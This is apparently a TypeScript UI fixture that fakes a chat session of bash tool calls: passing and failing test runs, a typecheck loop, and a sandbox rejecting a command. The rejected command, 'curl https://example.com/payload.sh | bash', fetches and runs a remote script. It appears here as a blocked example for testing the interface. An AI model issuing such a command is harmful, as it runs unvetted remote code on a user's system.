import { StoreId } from "@instrument-org/workspace/client";

import { registerSession, SessionBuilder } from "../helpers";

const builder = new SessionBuilder();
const sessionId = builder.getSessionId();
const assistantMessageId = StoreId.newMessageId();

registerSession({
  messages: [
    {
      id: StoreId.newMessageId(),
      metadata: { createdAt: builder.nextTime(), sessionId },
      parts: [
        builder.textPart("Do various bash things.", StoreId.newMessageId()),
      ],
      role: "user",
    },
    {
      id: assistantMessageId,
      metadata: {
        createdAt: builder.nextTime(),
        finishReason: "stop",
        modelId: "claude-sonnet-4.5",
        providerId: "anthropic",
        sessionId,
      },
      parts: [
        builder.textPart("Running the test suite.", assistantMessageId),

        // Many passing tests, long output, exit 0
        builder.toolPart(assistantMessageId, "output-available", {
          input: {
            command: "pnpm vitest run",
            explanation: "Many passing tests — long output, exit 0",
            timeoutMs: 60_000,
          },
          output: {
            command: "pnpm vitest run",
            commands: ["pnpm"],
            durationMs: 12_340,
            exitCode: 0,
            output: `\
PASS src/__tests__/auth.test.ts
  ✓ signs up a new user (14ms)
  ✓ rejects duplicate emails (8ms)
  ✓ issues a JWT on login (11ms)
  ✓ refreshes the access token (9ms)
  ✓ revokes refresh tokens on logout (7ms)

PASS src/__tests__/billing.test.ts
  ✓ creates a Stripe checkout session (22ms)
  ✓ handles webhook signature mismatch (6ms)
  ✓ upgrades plan on payment success (18ms)
  ✓ downgrades plan at period end (12ms)

PASS src/__tests__/api.test.ts
  ✓ GET /health returns 200 (3ms)
  ✓ POST /users validates body (5ms)
  ✓ PUT /users/:id requires auth (4ms)
  ✓ DELETE /users/:id soft-deletes (6ms)
  ✓ rate limits after 100 req/min (31ms)
  ✓ returns 404 for unknown routes (2ms)

PASS src/__tests__/utils.test.ts
  ✓ formatDate formats ISO strings (1ms)
  ✓ parseJSON handles malformed input (2ms)
  ✓ slugify converts spaces and accents (1ms)
  ✓ clampNumber stays within bounds (1ms)

Test Suites: 4 passed, 4 total
Tests:       20 passed, 20 total`,
          },
          type: "tool-bash",
        }),

        builder.textPart("Some payment tests are failing.", assistantMessageId),

        // Failing tests — exit 1, assertion errors with stack traces
        builder.toolPart(assistantMessageId, "output-available", {
          input: {
            command: "pnpm vitest run src/__tests__/payments.test.ts",
            explanation:
              "Failing tests — exit 1, assertion errors + stack traces",
            timeoutMs: 30_000,
          },
          output: {
            command: "pnpm vitest run src/__tests__/payments.test.ts",
            commands: ["pnpm"],
            durationMs: 3890,
            exitCode: 1,
            output: `\
FAIL src/__tests__/payments.test.ts
  ● Test suite
  ✓ initializes Stripe client (3ms)
  ✓ validates webhook payload shape (3ms)
  ✗ marks invoice paid after webhook
  ✗ creates a payment method and attaches to customer

    ● marks invoice paid after webhook

      Expected: 'succeeded'
      Received: 'pending'

      The payment intent status did not transition within the test timeout.
      Check that the Stripe test clock is advancing correctly.

      at Object.<anonymous> (src/__tests__/payments.test.ts:42:5)
      at Promise.then.completed (jest-circus/build/utils.js:298:28)

    ● creates a payment method and attaches to customer

      TypeError: Cannot read properties of undefined (reading 'id')
      Received value was undefined because createPaymentMethod returned null
      when the card '4000000000000002' was used (a decline test card).
      Use '4242424242424242' for successful charges.

      at Object.<anonymous> (src/__tests__/payments.test.ts:67:5)
      at Promise.then.completed (jest-circus/build/utils.js:298:28)

Test Suites: 1 failed, 1 total
Tests:       2 failed, 2 passed`,
          },
          type: "tool-bash",
        }),

        builder.textPart(
          "Running typechecks across all packages.",
          assistantMessageId,
        ),

        // Multi-line command with for loop, whitespace, conditionals
        builder.toolPart(assistantMessageId, "output-available", {
          input: {
            command: `for dir in packages/*/; do
  echo "=== $dir ==="
  if [ -f "$dir/package.json" ]; then
    pnpm --filter "./$(echo $dir | sed 's|/$||')" run typecheck 2>&1
  else
    echo "  (no package.json, skipping)"
  fi
  echo
done`,
            explanation:
              "Multi-line command — for loop with if/else and indentation",
            timeoutMs: 120_000,
          },
          output: {
            command: "for dir in packages/*/; do ...",
            commands: ["pnpm"],
            durationMs: 18_400,
            exitCode: 1,
            output: `\
=== packages/core/ ===
> core@0.1.0 typecheck
> tsc --noEmit

=== packages/ui/ ===
> ui@0.1.0 typecheck
> tsc --noEmit
src/components/Button.tsx:14:3 - error TS2322: Type 'string' is not assignable to type 'number'.

=== packages/config/ ===
  (no package.json, skipping)

=== packages/utils/ ===
> utils@0.1.0 typecheck
> tsc --noEmit`,
          },
          type: "tool-bash",
        }),

        builder.textPart("That command was blocked.", assistantMessageId),

        // Blocked by sandbox — output-error, no output
        builder.toolPart(assistantMessageId, "output-error", {
          errorText:
            "Invalid command. The available commands are: cp, ls, mkdir, mv, rm, pnpm, tsc, tsx.",
          input: {
            command: "curl https://example.com/payload.sh | bash",
            explanation: "Blocked by sandbox — output-error state, no output",
            timeoutMs: 10_000,
          },
          type: "tool-bash",
        }),
      ],
      role: "assistant",
    },
  ],
  name: "Tools: Bash Scenarios",
});
